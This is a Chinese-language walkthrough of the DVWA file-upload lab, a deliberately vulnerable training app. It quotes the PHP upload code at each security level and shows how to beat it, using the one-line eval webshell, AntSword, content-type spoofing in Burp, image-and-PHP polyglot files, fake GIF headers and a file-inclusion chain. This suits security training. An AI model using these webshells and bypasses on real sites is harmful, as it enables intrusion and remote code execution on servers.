<center>File Upload文件上传</center>





[toc]







## File Upload文件上传

> 文件上传







### 1. low

> 低级
>
> 代码

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
```

> 中国蚁剑

```shell
# 下载
wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip

# 解压
unzip AntSword-Loader-v4.0.3-linux-x64.zip

# 运行
./AntSword
```

> 没有做任何过滤，上传`一句话木马`

```php
<?php eval($_POST['cmd']); ?>
```

> 蚁剑连接:

```shell
url  =  木马地址
密码  =  cmd
```





### 2. medium

> 中级
>
> 代码

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

```

> 对上传文件进行限制。

* 方法一：用文件包含的漏洞+ 文件上传

```shell
1. burp 获取cookie 文件包含 填入 蚁剑中
PHPSESSID=5skbhhtisu1kf4vfe8jvh4a2l5; security=high

2. 输入url, low级别上传的木马
http://192.168.0.111:8000/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/info.php

3. 密码
cmd

4. 连接成功。
```

方法二：

> `只检查文件type,没有检查文件后缀的问题。type并不重要`

```shell
1. 修改木马为 .jpg  

2. 打开burp,文件改为2.php

3. 文件上传成功，蚁剑连接。
```





### 3. high

> 高级
>
> 代码

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {
```

> 开始 检查文件后缀了。
>
> `getimagesize`检查文件头

方法一：图片木马捆绑

```shell
# windown
copy hack.jpg/b + 1.php/a  3.jpg

# linux
cat hack.jpg 1.php > 3.jpg
```

> 图片和代码就被写入了，上传`3.jpg`

```shell
蚁剑连接木马 3.jpg

# 牛b
```

方法二：修改文件头 

```php
GIF98 
<?php eval($_POST['cmd']); ?>
```

> 上传成功`hackable/uploads/3.jpg `

```shell
http://192.168.0.111:8000/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/3.jpg

# 密码
cmd
```





### 4. impossible

> 不可能的
>
> 代码

```php

<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Where are we going to be writing to?
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
        ( $uploaded_size < 100000 ) &&
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
        }
```















